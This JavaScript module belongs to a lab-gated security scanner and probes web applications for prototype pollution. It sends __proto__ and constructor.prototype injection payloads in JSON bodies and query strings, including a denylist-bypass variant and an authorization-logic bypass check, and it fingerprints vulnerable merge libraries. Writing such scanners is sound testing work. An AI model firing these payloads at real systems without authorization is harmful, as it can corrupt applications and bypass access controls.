// Dark Matter rule-based scanner — prototype pollution probe (#35).
//
// First LANGUAGE-RUNTIME class: the payload is a property NAME, not a value.
//   T1. __proto__ via JSON merge sink — HIGH/CRITICAL
//   T2. constructor.prototype chain — HIGH (denylist bypass when T1 neg)
//   T3. Query-string parser pollution — MEDIUM/HIGH
//   T4. Pollution -> client gadget chain — HIGH (one predefined shape)
//   T5. Logic bypass via polluted key — CRITICAL (lab-only, differential)
//
// SAFETY (hard): LAB-GATED — the entire probe returns [] unless the target
// host is in opts.labTargets (pollution is process-global by nature).
// Per-run unique canary (__pp_dm_<runid>), never a real app key, never an
// `isAdmin`-named canary. No exploit development: T4 uses exactly one
// predefined gadget shape; T5 uses the lab's own account only.
// Oracles: benign-nested-key control FIRST (a merge that won't merge the
// benign key is NOT VULNERABLE); canary reflection in a later response;
// merge-sink library fingerprint (vulnerable lodash/jQuery/deepmerge).
// Severity stays honest: pollution without a reachable gadget = INFO/LOW.

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function isLab(url, opts) {
  try {
    const host = new URL(url).hostname;
    return String(opts.labTargets || '')
      .split(/[,\s]+/)
      .filter(Boolean)
      .some((h) => host === h || host.endsWith('.' + h));
  } catch {
    return false;
  }
}

async function postJson(url, obj, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, 'Content-Type': 'application/json', ...(opts.headers || {}) },
      body: JSON.stringify(obj),
      redirect: 'manual',
    });
    const text = await res.text().catch(() => '');
    return { status: res.status, text: text.slice(0, 300000) };
  } finally {
    clearTimeout(t);
  }
}

async function getText(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { 'User-Agent': UA }, redirect: 'manual' });
    return await res.text().catch(() => '');
  } catch {
    return '';
  } finally {
    clearTimeout(t);
  }
}

function ev(request, response, impact) {
  return { request, response, impact_demo: impact, signalCorrelated: true };
}

// Vulnerable merge-sink library fingerprints (version-pinned, cited).
const MERGE_SINKS = [
  { re: /lodash[^"']*?(\d+\.\d+\.\d+)/i, name: 'lodash', vuln: (v) => cmpVer(v, '4.17.11') < 0 },
  { re: /jquery[^"']*?(\d+\.\d+\.\d+)/i, name: 'jQuery', vuln: (v) => cmpVer(v, '3.4.0') < 0 },
  { re: /deepmerge/i, name: 'deepmerge', vuln: () => true },
  { re: /merge-deep/i, name: 'merge-deep', vuln: () => true },
];

function cmpVer(a, b) {
  const pa = a.split('.').map(Number);
  const pb = b.split('.').map(Number);
  for (let i = 0; i < 3; i++) {
    if ((pa[i] || 0) !== (pb[i] || 0)) return (pa[i] || 0) - (pb[i] || 0);
  }
  return 0;
}

async function fingerprintMergeSinks(url, opts) {
  const text = await getText(url, opts);
  const hits = [];
  for (const s of MERGE_SINKS) {
    const m = text.match(s.re);
    if (m && s.vuln(m[1] || '')) hits.push(`${s.name}${m[1] ? '@' + m[1] : ''}`);
  }
  return hits;
}

// ---- T1: __proto__ JSON merge ------------------------------------------------
async function t1Proto(url, canary, opts) {
  const findings = [];
  // Control: benign nested key must merge first.
  const ctrl = await postJson(url, { a: { b: { [`ctrl_${canary}`]: '1' } } }, opts).catch(() => null);
  const ctrlMerged = ctrl && ctrl.text.includes(`ctrl_${canary}`);
  const bodies = [
    { __proto__: { [`__pp_dm_${canary}`]: 't1' } },
    { a: { __proto__: { [`__pp_dm_${canary}`]: 't1n' } } },
  ];
  for (const body of bodies) {
    const r = await postJson(url, body, opts).catch(() => null);
    if (!r) continue;
    // Oracle: canary reflected back in this or a follow-up response.
    const follow = await getText(url, opts);
    const reflected = r.text.includes(`__pp_dm_${canary}`) || follow.includes(`__pp_dm_${canary}`);
    if (reflected && ctrlMerged) {
      findings.push({
        class: 'prototype_pollution',
        id: `pp-proto-${rand()}`,
        title: 'Prototype pollution — __proto__ merge sink accepts attacker keys (HIGH)',
        severity: 'high',
        url,
        parameter: '__proto__',
        evidence: ev(
          `POST ${url} JSON {"__proto__":{"__pp_dm_${canary}":"t1"}} (control benign key merged: ${ctrlMerged})`,
          `Canary __pp_dm_${canary} reflected in server response — the merge sink walks __proto__ keys.`,
          'Prototype pollution root cause: attacker keys reach Object.prototype merge path.'
        ),
      });
      break;
    }
  }
  return { findings, confirmed: findings.length > 0 };
}

// ---- T2: constructor.prototype chain ----------------------------------------
async function t2Ctor(url, canary, opts, t1neg) {
  const findings = [];
  const body = { constructor: { prototype: { [`__pp_dm_${canary}`]: 't2' } } };
  const r = await postJson(url, body, opts).catch(() => null);
  if (!r) return findings;
  const follow = await getText(url, opts);
  if (r.text.includes(`__pp_dm_${canary}`) || follow.includes(`__pp_dm_${canary}`)) {
    findings.push({
      class: 'prototype_pollution',
      id: `pp-ctor-${rand()}`,
      title: t1neg
        ? 'Prototype pollution — constructor.prototype denylist bypass (MEDIUM)'
        : 'Prototype pollution — constructor.prototype chain (HIGH)',
      severity: t1neg ? 'medium' : 'high',
      url,
      parameter: 'constructor.prototype',
      evidence: ev(
        `POST ${url} JSON {"constructor":{"prototype":{"__pp_dm_${canary}":"t2"}}}`,
        `Canary reflected — merge walks constructor.prototype${t1neg ? ' even though __proto__ was blocked (naive denylist bypass)' : ''}.`,
        'Prototype pollution via constructor chain.'
      ),
    });
  }
  return findings;
}

// ---- T3: query-string parser pollution --------------------------------------
async function t3Query(url, canary, opts) {
  const findings = [];
  const variants = [
    `__proto__[__pp_dm_${canary}]=t3`,
    `a[__proto__][__pp_dm_${canary}]=t3`,
  ];
  for (const q of variants) {
    const target = url + (url.includes('?') ? '&' : '?') + q;
    const text = await getText(target, opts);
    if (text.includes(`__pp_dm_${canary}`)) {
      findings.push({
        class: 'prototype_pollution',
        id: `pp-query-${rand()}`,
        title: 'Prototype pollution — query parser merges __proto__ keys (MEDIUM)',
        severity: 'medium',
        url: target,
        parameter: '__proto__',
        evidence: ev(
          `GET ${target}`,
          `Canary __pp_dm_${canary} reflected — the query parser merges __proto__ keys into objects.`,
          'Request-scoped or global pollution via query-string parser.'
        ),
      });
      break;
    }
  }
  return findings;
}

// ---- T4: gadget chain (one predefined shape) ---------------------------------
async function t4Gadget(url, canary, opts, polluted) {
  const findings = [];
  if (!polluted) return findings;
  // Predefined shape only: polluted key consumed into a script/src-ish sink.
  const text = await getText(url, opts);
  const gadget = new RegExp(
    `(src|href)\\s*=\\s*["'][^"']*__pp_dm_${canary}[^"']*["']|<script[^>]*__pp_dm_${canary}`,
    'i'
  );
  if (gadget.test(text)) {
    findings.push({
      class: 'prototype_pollution',
      id: `pp-gadget-${rand()}`,
      title: 'Prototype pollution — polluted key reaches script/src sink (HIGH)',
      severity: 'high',
      url,
      parameter: `__pp_dm_${canary}`,
      evidence: ev(
        `GET ${url} after pollution`,
        `Canary appears inside a src/href/script sink — the application's own JS consumes the polluted key (predefined gadget shape).`,
        'Pollution -> client gadget chain: root cause + chained impact recorded as one finding.'
      ),
    });
  }
  return findings;
}

// ---- T5: logic bypass (lab-only, differential) -------------------------------
async function t5LogicBypass(url, canary, opts) {
  const findings = [];
  const lab = opts.ppLab; // { actionUrl, denyKeyword, allowKeyword }
  if (!lab || !lab.actionUrl) return findings;
  const before = await getText(lab.actionUrl, opts);
  const deniedBefore =
    !before || (lab.denyKeyword && before.toLowerCase().includes(lab.denyKeyword.toLowerCase()));
  // Pollute a decision-shaped key on our OWN lab session only.
  await postJson(url, { __proto__: { [`__pp_dm_${canary}`]: '1' } }, opts).catch(() => null);
  const after = await getText(lab.actionUrl, opts);
  const allowedAfter =
    lab.allowKeyword && after.toLowerCase().includes(lab.allowKeyword.toLowerCase());
  if (deniedBefore && allowedAfter) {
    findings.push({
      class: 'prototype_pollution',
      id: `pp-logic-${rand()}`,
      title: 'Prototype pollution — logic bypass via polluted key (CRITICAL)',
      severity: 'critical',
      url: lab.actionUrl,
      parameter: `__pp_dm_${canary}`,
      evidence: ev(
        `POST ${url} __proto__ pollution, then GET ${lab.actionUrl} (lab-owned session)`,
        `Denied before pollution, allowed after — differential holds with clean control. Lab account's OWN session only.`,
        'Authorization-logic bypass via prototype pollution.'
      ),
    });
  }
  return findings;
}

export async function probePrototypePollution(url, opts = {}) {
  const findings = [];
  if (!isLab(url, opts)) return findings;
  const canary = rand();
  const sinks = await fingerprintMergeSinks(url, opts);
  if (sinks.length) {
    findings.push({
      class: 'prototype_pollution',
      id: `pp-sink-${rand()}`,
      title: `Vulnerable merge library fingerprinted: ${sinks.join(', ')} (INFO)`,
      severity: 'low',
      url,
      parameter: 'js-bundle',
      evidence: ev(
        `GET ${url} (bundle fingerprint)`,
        `Merge-sink libraries with known pollution CVEs: ${sinks.join(', ')}.`,
        'Library-level pollution exposure — version-pinned, cited.'
      ),
    });
  }
  const depth = opts.depth || 'standard';
  const { findings: f1, confirmed } = await t1Proto(url, canary, opts);
  findings.push(...f1);
  findings.push(...(await t2Ctor(url, canary, opts, f1.length === 0)));
  findings.push(...(await t3Query(url, canary, opts)));
  if (depth === 'deep') {
    findings.push(...(await t4Gadget(url, canary, opts, confirmed)));
    findings.push(...(await t5LogicBypass(url, canary, opts)));
  }
  return findings;
}

export const __ppMeta = { phases: ['prototype-pollution'], depth: ['quick', 'standard', 'deep'], labGated: true };
